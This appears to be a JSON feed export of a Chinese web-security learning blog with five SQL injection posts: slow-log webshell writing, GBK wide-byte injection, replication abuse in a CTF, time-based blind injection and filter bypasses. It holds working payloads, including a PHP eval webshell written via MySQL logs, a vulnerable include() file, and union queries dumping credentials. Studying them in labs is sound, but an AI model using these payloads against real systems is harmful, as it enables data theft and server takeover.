{
    "version": "https://jsonfeed.org/version/1",
    "title": "welcome to my blog • All posts by \"sql注入\" category",
    "description": "不定时更新web安全相关知识",
    "home_page_url": "https://hq185187.github.io",
    "items": [
        {
            "id": "https://hq185187.github.io/2023/07/06/%E6%85%A2%E6%97%A5%E5%BF%97%E6%B3%A8%E5%85%A5/",
            "url": "https://hq185187.github.io/2023/07/06/%E6%85%A2%E6%97%A5%E5%BF%97%E6%B3%A8%E5%85%A5/",
            "title": "慢日志注入",
            "date_published": "2023-07-06T08:43:36.682Z",
            "content_html": "<h4 id=\"1-load_file读取函数\"><a class=\"markdownIt-Anchor\" href=\"#1-load_file读取函数\">#</a> 1 load_file (): 读取函数</h4>\n<p>MySQL：5.0.96<br>\n<img data-src=\"https://s2.loli.net/2023/07/06/Ok7pmWcXfoEA2TI.png\" alt=\"屏幕截图 2023-07-06 203810.png\"><br>\n%27 是引号</p>\n<h4 id=\"2文件写入\"><a class=\"markdownIt-Anchor\" href=\"#2文件写入\">#</a> 2. 文件写入</h4>\n<p>into outfile: 能写入多行，按格式输出<br>\n into dumpfile: 只能写入一行，没有输出格式<br>\n<img data-src=\"https://s2.loli.net/2023/07/06/bnKqk5r8yRWMumN.png\" alt=\"屏幕截图 2023-07-06 205301.png\"><br>\n<img data-src=\"https://s2.loli.net/2023/07/06/vIy8rDcaG9U5nwg.png\" alt=\"屏幕截图 2023-07-06 205603.png\"><br>\n 通过对比也可以看出两种方式的区别<br>\n dumpfile 没有输出格式，只能输出一行（这里没有体现）</p>\n<p>6.34 版本以后，secure_file_priv<br>\n 的值为 NULL, 并且无法用 SQL 语句对其修改<br>\n secure_file_priv 参数是用来限制 LOAD DATA,SELECT…INTO OUTFILE 语句和 LOAD_FILE () 函数等等<br>\n当它的值为空时，表示不限制 MySQL 的导入 / 导出<br>\n当它的值为 null 时，表示不允许 MySQL 导入导出</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">show variables like &#x27;%secure_file_priv%&#x27;;</span><br></pre></td></tr></table></figure>\n<p>先本地连接 MySQL:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql.exe -u root -p</span><br><span class=\"line\">输入密码</span><br></pre></td></tr></table></figure>\n<p>当查询语句的时间超过系统默认的时间时，该语句会被记入慢查询日志。一般都是通过 long_query_time 选项设置，以秒为单位。查看默认的时间：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">show global variables like &#x27;%long_query_time%&#x27;;</span><br></pre></td></tr></table></figure>\n<p>我这里是 10s</p>\n<p>开启慢查询:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">set global slow_query_log=1;</span><br></pre></td></tr></table></figure>\n<p>查看参数:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">SHOW VARIABLES like &#x27;%slow_query_log%&#x27;;</span><br></pre></td></tr></table></figure>\n<p>此时如果有文件包含的点，我们可以 getshell</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\"></span><br><span class=\"line\">$a=$_GET[&#x27;a&#x27;];</span><br><span class=\"line\"></span><br><span class=\"line\">$b=include($a);</span><br><span class=\"line\"></span><br><span class=\"line\">echo $b;</span><br></pre></td></tr></table></figure>\n<p>在 MySQL 命令行中，向日志文件写入 shell:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select &#x27;&lt;?php eval($_GET[X])?&gt;&#x27; or sleep(11);</span><br></pre></td></tr></table></figure>\n<p>直接 getshell:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/webtest/1.php?a=D:\\phpstudy_pro\\Extensions\\MySQL5.7.26\\data\\laptop-slow.log&amp;X=phpinfo();</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://s2.loli.net/2023/07/06/Zs6HIdUKg2VFB8r.png\" alt=\"屏幕截图 2023-07-06 162417.png\"></p>\n<p>就算没有文件包含的点，我们也可以 getshell<br>\n 将日志文件位置改为能访问的文件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">SET GLOBAL slow_query_log_file=&#x27;D:\\phpstudy_pro\\WWW\\shell.php&#x27;;</span><br></pre></td></tr></table></figure>\n<p>此时在 MySQL 命令行添加 shell 日志<br>\n <code>select '&lt;?php eval($_GET[shell])?&gt;' or sleep(11);</code> <br>\n 直接可以在 shell.php 里面 getshell</p>\n",
            "tags": []
        },
        {
            "id": "https://hq185187.github.io/2023/06/29/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/",
            "url": "https://hq185187.github.io/2023/06/29/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/",
            "title": "宽字节注入学习",
            "date_published": "2023-06-29T10:06:07.947Z",
            "content_html": "<h3 id=\"先介绍几个函数\"><a class=\"markdownIt-Anchor\" href=\"#先介绍几个函数\">#</a> 先介绍几个函数</h3>\n<ol>\n<li>addslashes：在预定义字符（单引号，双引号，反斜杠，NULL）前加反斜杠</li>\n<li>mysql_real_escape_string：转义 SQL 语句中使用的字符串中的特殊字符 ( <code>\\x00,\\n,\\r,\\,',&quot;,\\x1a</code> )</li>\n</ol>\n<h3 id=\"原理\"><a class=\"markdownIt-Anchor\" href=\"#原理\">#</a> 原理</h3>\n<p>窄字节：字符大小为一个一个字节<br>\n宽字节：字符大小为两个字节<br>\n所有英文默认占一个字节，汉字占两个字节<br>\n常见的宽字节编码：GB2312,GBK,GB18030,BIG5,Shift_JIS</p>\n<p>当数据库用 GBK 编码而 PHP 用 UTF-8 编码，当防止 SQL 注入的上面的函数发挥作用，在单双引号前加了反斜杠 <code>\\</code> 。假如我们在单双引号前加一个字符，使其和斜杠组合成一个汉字，从而保留单双引号，使其发挥作用。<br>\n注意：<br>\n添加的字符 ASCII 要大于 128，两个字符才能组合成汉字，因为前一个 ascii 码要大于 128，才到汉字的范围 ，这一点需要注意，经典的有 % df</p>\n<p>例子：Sqli-labs32 关<br>\n输入 1‘会被转义成 <code>1\\'</code> <br>\n 输入 1% df’%23 就可以成功回显<br>\n然后就是常规的字符型注入<br>\n爆表：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/?id=-1%df&#x27; union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=database()%23</span><br></pre></td></tr></table></figure>\n<p>爆列名：（这里表名要用 16 进制）</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=-1%df&#x27; union select 1,2,group_concat(column_name)from information_schema.columns where table_schema=database() and table_name=0x7573657273%23</span><br></pre></td></tr></table></figure>\n<p>爆字段：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=-1%df&#x27; union select 1,2,group_concat(username,0x7e,password)from users%23</span><br></pre></td></tr></table></figure>\n",
            "tags": []
        },
        {
            "id": "https://hq185187.github.io/2023/06/21/MySQL%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6/",
            "url": "https://hq185187.github.io/2023/06/21/MySQL%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6/",
            "title": "Mysql主从复制",
            "date_published": "2023-06-21T03:09:09.169Z",
            "content_html": "<h2 id=\"原理\"><a class=\"markdownIt-Anchor\" href=\"#原理\">#</a> 原理</h2>\n<p>简单说就是主服务器上执行的语句，从服务器也执行了相同的语句，主服务器的操作在从服务器上产生了相同的效果</p>\n<p>过程：</p>\n<ul>\n<li>master（主数据库）将用户对数据库的更新操作以二进制格式保存进 BinaryLog 日志文件中</li>\n<li>slave (从数据库) 的 I/O 进程读取主数据库的二进制日志文件</li>\n<li>slave 将接收到的日志内容添加到 relay-kog，从数据库的 SQL 进程检测新的日志内容解析并执行</li>\n</ul>\n<p><img data-src=\"https://img-blog.csdnimg.cn/20201102143527123.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNzg2Mjg1,size_16,color_FFFFFF,t_70#pic_center\" alt=\"图片\"></p>\n<h2 id=\"配置\"><a class=\"markdownIt-Anchor\" href=\"#配置\">#</a> 配置</h2>\n<p>master：192.168.81.122(kali)<br>\nslave：192.168.81.113(ubuntu)</p>\n<h3 id=\"master配置\"><a class=\"markdownIt-Anchor\" href=\"#master配置\">#</a> Master 配置：</h3>\n<p>命令行进入 MySQL:<br>\n <code> mysql -u root -p</code> <br>\n 接着输入密码，然后创建用户：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//root和root是从服务器器(slave)的数据库用户名和密码</span><br><span class=\"line\">GRANT REPLICATION SLAVE ON *.* to &#x27;root&#x27;@&#x27;192.168.81.113&#x27; identified by &#x27;root&#x27;;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">//刷新系统权限表的配置</span><br><span class=\"line\">flush privileges;</span><br></pre></td></tr></table></figure>\n<p>找到 mysql 的配置文件 /etc/my.conf, 增加以下配置</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#开启binlog</span><br><span class=\"line\">log-bin=mysql-bin</span><br><span class=\"line\">server-id=1</span><br><span class=\"line\">#需要同步的数据库,如果不配置则同步所以数据库</span><br><span class=\"line\">binlog-do-db=mysql_test</span><br><span class=\"line\">#binlog日志保留的天数</span><br><span class=\"line\">expire-logs-days=10</span><br></pre></td></tr></table></figure>\n<p>配置完成后重启 mysql:<br>\nservice mysql restart<br>\n 查看当前 binlog 日志的信息<br>\n <code>show master status\\G</code></p>\n<p>mysql-bin.000002</p>\n<h3 id=\"slave配置\"><a class=\"markdownIt-Anchor\" href=\"#slave配置\">#</a> slave 配置</h3>\n<p>找到 /etc/my.cnf 配置文件，增加以下配置:<br>\n <code>server-id=2</code> <br>\n 接着用命令行登录到 mysql 服务器:<br>\n <code>mysql -u root -p</code> <br>\n 进入 MySQL 后输入以下命令:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">CHANGE MASTER TO </span><br><span class=\"line\">MASTER_HOST=&#x27;192.168.81.122&#x27;,//主机IP</span><br><span class=\"line\">MASTER_USER=&#x27;root&#x27;,//之前创建的用户账号</span><br><span class=\"line\">MASTER_PASSWORD=&#x27;root&#x27;,//之前创建的用户密码</span><br><span class=\"line\">MASTER_LOG_FILE=&#x27;mysql-bin.000002&#x27;,//master主机的binlog日志名称</span><br><span class=\"line\">MASTER_LOG_POS=862,//binlog日志偏移量</span><br><span class=\"line\">master_port=3306;//端口</span><br></pre></td></tr></table></figure>\n<p>启动 slave 服务:<br>\n <code>start slave;</code> <br>\n 查看是否启动成功:<br>\n <code>show slave status\\G</code></p>\n<h2 id=\"测试主从复制\"><a class=\"markdownIt-Anchor\" href=\"#测试主从复制\">#</a> 测试主从复制</h2>\n<p>在 maser 主机执行:</p>\n<figure class=\"highlight text\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">CREATE TABLE `tb_commodity_info` (</span><br><span class=\"line\">  `id` varchar(32) NOT NULL,</span><br><span class=\"line\">  `commodity_name` varchar(512) DEFAULT NULL COMMENT &#x27;商品名称&#x27;,</span><br><span class=\"line\">  `commodity_price` varchar(36) DEFAULT &#x27;0&#x27; COMMENT &#x27;商品价格&#x27;,</span><br><span class=\"line\">  `number` int(10) DEFAULT &#x27;0&#x27; COMMENT &#x27;商品数量&#x27;,</span><br><span class=\"line\">  `description` varchar(2048) DEFAULT &#x27;&#x27; COMMENT &#x27;商品描述&#x27;,</span><br><span class=\"line\">  PRIMARY KEY (`id`)</span><br><span class=\"line\">) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COMMENT=&#x27;商品信息表&#x27;;</span><br></pre></td></tr></table></figure>\n<p>此时看从数据库的结构</p>\n<h2 id=\"例题2023安洵杯-confronting-robots\"><a class=\"markdownIt-Anchor\" href=\"#例题2023安洵杯-confronting-robots\">#</a> 例题：2023 安洵杯 Confronting robots</h2>\n<p>前面都能用 sqlmap 扫出来直接到最后一步主从复制<br>\n查看数据库版本：<br>\nselect version();<br>\n 在自己 vps 上起一个相同版本的 mariadb，修改默认配置文件 vim /etc/mysql/my.cnf 允许远程访问并启用二进制日志<br>\n server-id = 1 log_bin = /var/log/mysql/mariadb-bin<br>\nservice mysql restart<br>\n 自己的 vps 作为主，题目环境作为从<br>\n主服务器执行<br>\n CREATE USER ‘atest’@’%’ IDENTIFIED BY ‘testtest’;<br>\ngrant replication slave on . to ‘atest’@’%’;<br>\nflush privileges; 使用 select database (); show tables; desc game; 等查询命令将从服务器上的数据库结构一比一复刻到<br>\n主服务器上 CREATE DATABASE IF NOT EXISTS game_data;<br>\nuse game_data<br>\nCREATE TABLE IF NOT EXISTS game ( round int(20) , choice varchar(256) ) ;<br>\n 在主服务器 mysql 中执行 show master status; 记录下来 File 和 Position mysql-bin.000001 1376<br>\n 在从服务器 (题目环境) 命令框中输入<br>\n CHANGE MASTER TO MASTER_HOST=‘主服务器 ip’, MASTER_USER=‘atest’,<br>\nMASTER_PASSWORD=‘testtest’, MASTER_LOG_FILE=‘mariadb-bin.000001 (记录的值)’,MASTER_LOG_POS=1365 (记录的值);<br>\nstart slave;<br>\nshow slave status;<br>\n 显示这个表示成功连接上<br>\n主服务器中执行<br>\n INSERT INTO game (round , choice) VALUES (‘1’, ‘R’), (‘2’, ‘R’),(‘3’, ‘R’), (‘4’, ‘R’),(‘5’, ‘R’), (‘6’, ‘R’),(‘7’,‘R’), (‘8’, ‘R’),(‘9’, ‘R’), (‘10’, ‘R’);</p>\n<p>在开始挑战处输入对应的答案得到 flag</p>\n",
            "tags": []
        },
        {
            "id": "https://hq185187.github.io/2023/05/07/sql%E6%B3%A8%E5%85%A5%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/",
            "url": "https://hq185187.github.io/2023/05/07/sql%E6%B3%A8%E5%85%A5%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/",
            "title": "时间盲注",
            "date_published": "2023-05-07T07:33:27.765Z",
            "content_html": "<p>例子的表:</p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\">id</th>\n<th style=\"text-align:center\">name</th>\n<th style=\"text-align:center\">url</th>\n<th style=\"text-align:center\">alexa</th>\n<th style=\"text-align:center\">country</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">1</td>\n<td style=\"text-align:center\">Google</td>\n<td style=\"text-align:center\"><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZ29vZ2xlLmNtLw==\">https://www.google.cm/</span></td>\n<td style=\"text-align:center\">1</td>\n<td style=\"text-align:center\">USA</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">2</td>\n<td style=\"text-align:center\">淘宝</td>\n<td style=\"text-align:center\"><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudGFvYmFvLmNvbS8=\">https://www.taobao.com/</span></td>\n<td style=\"text-align:center\">13</td>\n<td style=\"text-align:center\">CN</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">3</td>\n<td style=\"text-align:center\">菜鸟教程</td>\n<td style=\"text-align:center\"><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5ydW5vb2IuY29tLw==\">http://www.runoob.com/</span></td>\n<td style=\"text-align:center\">10</td>\n<td style=\"text-align:center\">CN</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">4</td>\n<td style=\"text-align:center\">微博</td>\n<td style=\"text-align:center\"><span class=\"exturl\" data-url=\"aHR0cDovL3dlaWJvLmNvbS8=\">http://weibo.com/</span></td>\n<td style=\"text-align:center\">20</td>\n<td style=\"text-align:center\">CN</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">5</td>\n<td style=\"text-align:center\">Facebook</td>\n<td style=\"text-align:center\"><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tLw==\">https://www.facebook.com/</span></td>\n<td style=\"text-align:center\">3</td>\n<td style=\"text-align:center\">USA</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">7</td>\n<td style=\"text-align:center\">stackoverflow</td>\n<td style=\"text-align:center\"><span class=\"exturl\" data-url=\"aHR0cDovL3N0YWNrb3ZlcmZsb3cuY29tLw==\">http://stackoverflow.com/</span></td>\n<td style=\"text-align:center\">0</td>\n<td style=\"text-align:center\">IND</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"基本延时的盲注sleep\"><a class=\"markdownIt-Anchor\" href=\"#基本延时的盲注sleep\">#</a> 基本延时的盲注:sleep</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select * from 表名 where id=1 and sleep(2);</span><br></pre></td></tr></table></figure>\n<p>配合 if 语句</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if(expr1,expr2,expr3)</span><br><span class=\"line\">expr1是真,返回expr2,否则expr3</span><br><span class=\"line\">select * from websites where name=&#x27;1&#x27; or if(name=&#x27;Facebook&#x27;,sleep(2),null);</span><br><span class=\"line\">判断是否有网站名字为Facebook</span><br></pre></td></tr></table></figure>\n<p>配合截取函数<br>\n substr (string,start,length)<br>\nmid(string,start,length)</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select * from websites where name=&#x27;2&#x27; or if(substr((select name from websites where id=1),0,1)=&#x27;G&#x27;,sleep(2),0);</span><br></pre></td></tr></table></figure>\n<h3 id=\"1benchmark\"><a class=\"markdownIt-Anchor\" href=\"#1benchmark\">#</a> 1.benchmark()</h3>\n<p>benchmark 是 MySQL 的一个内置函数，作用是测试一些函数的执行速度.benchmark 中有两个参数，第一个是执行的次数，第二个是要执行的函数或者表达式</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; select benchmark(10000,md5(&#x27;a&#x27;));</span><br><span class=\"line\">+---------------------------+</span><br><span class=\"line\">| benchmark(10000,md5(&#x27;a&#x27;)) |</span><br><span class=\"line\">+---------------------------+</span><br><span class=\"line\">|                         0 |</span><br><span class=\"line\">+---------------------------+</span><br><span class=\"line\">1 row in set (0.01 sec)</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; select benchmark(100000000,md5(&#x27;a&#x27;));</span><br><span class=\"line\">+-------------------------------+</span><br><span class=\"line\">| benchmark(100000000,md5(&#x27;a&#x27;)) |</span><br><span class=\"line\">+-------------------------------+</span><br><span class=\"line\">|                             0 |</span><br><span class=\"line\">+-------------------------------+</span><br><span class=\"line\">1 row in set (14.29 sec)</span><br></pre></td></tr></table></figure>\n<p>可以看到执行次数不同，时间也不同，我们接下来用它来达到 sleep 的延时目的</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select 1 and if((substr(user(),1,1)=&#x27;r&#x27;),BENCHMARK(10000000,md5(&#x27;a&#x27;)),1);</span><br></pre></td></tr></table></figure>\n<h3 id=\"2heavy-query\"><a class=\"markdownIt-Anchor\" href=\"#2heavy-query\">#</a> 2.heavy query</h3>\n<p>通过大量的查询导致查询时间变长来达到延时目的</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select count(*) from information_schema.tables A,information_schema.tables B;</span><br><span class=\"line\"></span><br><span class=\"line\">select 1 and if((substr(user(),1,1)=&#x27;r&#x27;),(select count(*) from information_schema.tables A,information_schema.tables B;),1);</span><br></pre></td></tr></table></figure>",
            "tags": []
        },
        {
            "id": "https://hq185187.github.io/2023/04/29/sql%E6%B3%A8%E5%85%A5%E7%9A%84%E7%BB%95%E8%BF%87/",
            "url": "https://hq185187.github.io/2023/04/29/sql%E6%B3%A8%E5%85%A5%E7%9A%84%E7%BB%95%E8%BF%87/",
            "title": "SQL注入绕过",
            "date_published": "2023-04-28T17:31:47.527Z",
            "content_html": "<h1 id=\"一字符替换\"><a class=\"markdownIt-Anchor\" href=\"#一字符替换\">#</a> 一。字符替换</h1>\n<h3 id=\"1过滤空格\"><a class=\"markdownIt-Anchor\" href=\"#1过滤空格\">#</a> 1. 过滤空格</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">%0a,%0b,%0c,%0d,%09,%a0(只在特定字符集才能利用),/**/,括号等</span><br></pre></td></tr></table></figure>\n<h3 id=\"2select替换成空\"><a class=\"markdownIt-Anchor\" href=\"#2select替换成空\">#</a> 2.select 替换成空</h3>\n<p>双写 selectselect</p>\n<h3 id=\"3大小写绕过\"><a class=\"markdownIt-Anchor\" href=\"#3大小写绕过\">#</a> 3. 大小写绕过</h3>\n<p>MySQL 中是不区分大小写的，若是过滤了 SELECT, 就用 select 绕过，其他同理</p>\n<h3 id=\"4正则匹配\"><a class=\"markdownIt-Anchor\" href=\"#4正则匹配\">#</a> 4. 正则匹配</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">正则匹配\\bselect\\b可以用形如/*!50000*/方法绕过</span><br><span class=\"line\">/*!50000*/是一种特殊的注释,里面的SQL会被执行,50000是一个版本号,假设MySQL版本大于这个版本号就执行里面的SQL语句</span><br></pre></td></tr></table></figure>\n<h3 id=\"5替换了单引号或双引号忘记了反斜杠\"><a class=\"markdownIt-Anchor\" href=\"#5替换了单引号或双引号忘记了反斜杠\">#</a> 5. 替换了单引号或双引号，忘记了反斜杠</h3>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$sql</span>=<span class=\"string\">&quot;SELECT * FROM wp_news WHERE id=&#x27;可控点1&#x27; AND title=&#x27;可控点2&#x27;&quot;</span></span><br></pre></td></tr></table></figure>\n<p>绕过</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$sql</span>=<span class=\"string\">&quot;SELECT * FROM wp_news WHERE id=&#x27;a\\&#x27; AND title=&#x27;OR sleep(1)#&#x27;&quot;</span></span><br></pre></td></tr></table></figure>\n<p>第一个可控点的反斜杠转义可控点 1 预置的单引号，导致可控点 2 逃逸出单引号<br>\n eg</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"operator\">*</span> <span class=\"keyword\">from</span> websites <span class=\"keyword\">where</span> id<span class=\"operator\">=</span><span class=\"string\">&#x27;a\\&#x27;</span> <span class=\"keyword\">and</span> url<span class=\"operator\">=</span><span class=\"string\">&#x27;union select 1,2,(select concat(id,0x7e,url)from websites limit 1)#&#x27;</span>;</span><br></pre></td></tr></table></figure>\n<h3 id=\"二逃逸引号\"><a class=\"markdownIt-Anchor\" href=\"#二逃逸引号\">#</a> 二。逃逸引号</h3>\n<p>注入的重点是逃逸引号，但开发者往往会做一次 addslashes (转义单双引号，反斜杠), 怎么绕过</p>\n<h3 id=\"1编码解码\"><a class=\"markdownIt-Anchor\" href=\"#1编码解码\">#</a> 1. 编码解码</h3>\n<p>宽字节注入，稍后说</p>\n<h3 id=\"2意料之外的注入点\"><a class=\"markdownIt-Anchor\" href=\"#2意料之外的注入点\">#</a> 2. 意料之外的注入点</h3>\n<p>开发者在转义用户输入时遗漏了一些可注入点.PHP: 文件的上传名，http header,$SERVER [‘PHP_SELF’] 这些变量，稍后举例</p>\n<h3 id=\"3二次注入\"><a class=\"markdownIt-Anchor\" href=\"#3二次注入\">#</a> 3. 二次注入</h3>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\">id</th>\n<th style=\"text-align:center\">username</th>\n<th style=\"text-align:center\">password</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">1</td>\n<td style=\"text-align:center\">admin</td>\n<td style=\"text-align:center\">password</td>\n</tr>\n</tbody>\n</table>\n<p>假设一个表如上图，用户输入:</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">insert</span> <span class=\"keyword\">into</span> wp_user <span class=\"keyword\">values</span>(<span class=\"number\">2</span>,<span class=\"string\">&#x27;admin\\&#x27;</span><span class=\"keyword\">or</span>\\<span class=\"string\">&#x27;1&#x27;</span>,<span class=\"string\">&#x27;some pass&#x27;</span>);</span><br></pre></td></tr></table></figure>\n<p>此时库的内容是:</p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\">id</th>\n<th style=\"text-align:center\">username</th>\n<th style=\"text-align:center\">password</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">2</td>\n<td style=\"text-align:center\">admin’or’1</td>\n<td style=\"text-align:center\">somepass</td>\n</tr>\n</tbody>\n</table>\n<p>引号被转义，正常入库，但是当这个用户名被再次使用时</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$res</span>=<span class=\"title function_ invoke__\">mysqli_query</span>(<span class=\"variable\">$conn</span>,<span class=\"string\">&quot;SELECT password from wp_user where username=&#x27;<span class=\"subst\">$name</span>&#x27;&quot;</span>);</span><br></pre></td></tr></table></figure>\n<p>此时 SQL 语句为</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> password <span class=\"keyword\">from</span> wp_user <span class=\"keyword\">where</span> username<span class=\"operator\">=</span><span class=\"string\">&#x27;admin&#x27;</span><span class=\"keyword\">or</span><span class=\"string\">&#x27;1&#x27;</span>;</span><br></pre></td></tr></table></figure>\n<p>此时产生注入</p>\n<h3 id=\"4字符串截断\"><a class=\"markdownIt-Anchor\" href=\"#4字符串截断\">#</a> 4. 字符串截断</h3>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$title</span>=<span class=\"title function_ invoke__\">addslashes</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;title&#x27;</span>]);</span><br><span class=\"line\"><span 